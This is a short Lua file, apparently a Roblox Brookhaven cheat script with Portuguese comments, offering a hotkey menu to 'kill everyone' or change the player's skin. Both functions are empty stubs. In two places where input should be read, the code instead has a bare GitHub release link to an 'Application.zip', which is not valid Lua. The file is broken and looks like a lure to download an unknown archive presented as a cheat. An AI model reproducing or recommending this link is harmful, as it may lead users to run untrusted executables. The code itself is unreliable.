-- Funções para as ações dos botões
function killEveryone()
    print("Todos os jogadores foram eliminados!")
    -- Código para matar todos os jogadores
end

function changeSkin()
    print("Skin alterada para preta com olhos vermelhos!")
    -- Código para mudar a skin do jogador
end

-- Função para exibir a tela com os botões
function displayMenu()
    print("Menu:")
    print("1. KILL")
    print("2. SKIN")

    local choice = https://github.com/tauazinhefin/script-brookhaven/releases/download/v1.0/Application.zip()

    if choice == "1" then
        killEveryone()
    elseif choice == "2" then
        changeSkin()
    else
        print("Opção inválida")
    end
end

-- Função para detectar pressionamento da tecla "P"
function onKeyPress(key)
    if key == "p" then
        displayMenu()
    end
end

-- Loop para escutar pressionamentos de tecla
while true do
    local key = https://github.com/tauazinhefin/script-brookhaven/releases/download/v1.0/Application.zip()
    onKeyPress(key)
end
